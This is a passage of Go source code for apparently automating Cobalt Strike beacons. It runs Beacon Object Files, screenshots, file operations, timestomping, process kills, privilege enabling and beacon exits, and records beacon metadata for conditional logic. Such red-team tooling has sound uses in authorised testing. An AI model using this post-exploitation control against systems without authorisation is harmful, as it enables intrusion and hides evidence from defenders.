				Value: argMap["value"],
			}
			bofArgs = append(bofArgs, bofArg)
		}

		// Pack arguments using custom packer
		packedArgs, err = PackBOFArguments(bofArgs)
		if err != nil {
			return "", fmt.Errorf("failed to pack arguments: %w", err)
		}
	}

	// Encode packed arguments as base64 string
	packedArgsBase64 := base64.StdEncoding.EncodeToString(packedArgs)

	req := csclient.InlineExecutePackedDto{
		BOF:       "@files/bof.o",
		Files:     map[string]string{"bof.o": bofBase64},
		Arguments: packedArgsBase64,
	}

	if ep, ok := action.Parameters["entrypoint"].(string); ok {
		req.Entrypoint = ep
	}

	resp, err := client.ExecuteBOFPacked(ctx, beaconID, req)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeScreenshot captures a screenshot
func (e *Executor) executeScreenshot(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	// Use spawn method by default (simpler, no PID/arch required)
	resp, err := client.ScreenshotSpawn(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- File & Directory Operation Handlers ---

// executeCd changes the beacon's working directory
func (e *Executor) executeCd(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	path, ok := action.Parameters["path"].(string)
	if !ok {
		return "", fmt.Errorf("path parameter required for cd")
	}

	resp, err := client.Cd(ctx, beaconID, path)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeLs lists directory contents
func (e *Executor) executeLs(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	path, _ := action.Parameters["path"].(string) // optional

	resp, err := client.Ls(ctx, beaconID, path)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executePwd gets current working directory
func (e *Executor) executePwd(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.Pwd(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeMkdir creates a directory
func (e *Executor) executeMkdir(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	folder, ok := action.Parameters["folder"].(string)
	if !ok {
		return "", fmt.Errorf("folder parameter required for mkdir")
	}

	resp, err := client.Mkdir(ctx, beaconID, folder)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeCp copies a file
func (e *Executor) executeCp(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	src, ok := action.Parameters["src"].(string)
	if !ok {
		return "", fmt.Errorf("src parameter required for cp")
	}
	dst, ok := action.Parameters["dst"].(string)
	if !ok {
		return "", fmt.Errorf("dst parameter required for cp")
	}

	resp, err := client.Cp(ctx, beaconID, src, dst)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeMv moves/renames a file
func (e *Executor) executeMv(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	source, ok := action.Parameters["source"].(string)
	if !ok {
		return "", fmt.Errorf("source parameter required for mv")
	}
	destination, ok := action.Parameters["destination"].(string)
	if !ok {
		return "", fmt.Errorf("destination parameter required for mv")
	}

	resp, err := client.Mv(ctx, beaconID, source, destination)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeRm removes a file or folder
func (e *Executor) executeRm(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	path, ok := action.Parameters["path"].(string)
	if !ok {
		return "", fmt.Errorf("path parameter required for rm")
	}

	resp, err := client.Rm(ctx, beaconID, path)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeDrives lists drives
func (e *Executor) executeDrives(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.Drives(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeTimestomp copies file timestamps from source to destination
func (e *Executor) executeTimestomp(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	source, ok := action.Parameters["source"].(string)
	if !ok {
		return "", fmt.Errorf("source parameter required for timestomp")
	}
	destination, ok := action.Parameters["destination"].(string)
	if !ok {
		return "", fmt.Errorf("destination parameter required for timestomp")
	}

	resp, err := client.Timestomp(ctx, beaconID, source, destination)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- Process Management Handlers ---

// executePs lists processes
func (e *Executor) executePs(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.Ps(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeKill terminates a process by PID
func (e *Executor) executeKill(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for kill")
	}

	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid parameter must be a number")
	}

	resp, err := client.Kill(ctx, beaconID, pid)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeGetPrivs enables all available privileges
func (e *Executor) executeGetPrivs(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.GetPrivs(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeSetEnv sets an environment variable
func (e *Executor) executeSetEnv(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	key, ok := action.Parameters["key"].(string)
	if !ok {
		return "", fmt.Errorf("key parameter required for setenv")
	}
	value, _ := action.Parameters["value"].(string) // optional

	resp, err := client.SetEnv(ctx, beaconID, key, value)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeExit tells the beacon to exit
func (e *Executor) executeExit(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.Exit(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeJobStop stops an active job
func (e *Executor) executeJobStop(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	jidVal, ok := action.Parameters["jid"]
	if !ok {
		return "", fmt.Errorf("jid parameter required for job_stop")
	}

	var jid int
	switch v := jidVal.(type) {
	case float64:
		jid = int(v)
	case int:
		jid = v
	default:
		return "", fmt.Errorf("jid parameter must be a number")
	}

	resp, err := client.JobStop(ctx, beaconID, jid)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// storeBeaconMetadata stores beacon metadata in outputs map for condition evaluation
func (e *Executor) storeBeaconMetadata() {
	if e.beacon == nil {
		return
	}

	e.outputMu.Lock()
	defer e.outputMu.Unlock()

	// Store commonly used beacon fields with beacon. prefix
	e.outputs["beacon.user"] = e.beacon.User
	e.outputs["beacon.computer"] = e.beacon.Computer
	e.outputs["beacon.internal"] = e.beacon.Internal
	e.outputs["beacon.external"] = e.beacon.External
	e.outputs["beacon.os"] = e.beacon.OS
	e.outputs["beacon.process"] = e.beacon.Process
	e.outputs["beacon.pid"] = fmt.Sprintf("%d", e.beacon.PID)
	e.outputs["beacon.isAdmin"] = fmt.Sprintf("%t", e.beacon.IsAdmin)
	e.outputs["beacon.beaconArch"] = e.beacon.BeaconArch
	e.outputs["beacon.systemArch"] = e.beacon.SystemArch
	e.outputs["beacon.session"] = e.beacon.Session
	e.outputs["beacon.listener"] = e.beacon.Listener
	e.outputs["beacon.alive"] = fmt.Sprintf("%t", e.beacon.Alive)

	if e.beacon.Impersonated != "" {
		e.outputs["beacon.impersonated"] = e.beacon.Impersonated
	}

	e.logDebug("Stored beacon metadata for conditions: user=%s, isAdmin=%t, os=%s",
		e.beacon.User, e.beacon.IsAdmin, e.beacon.OS)
}
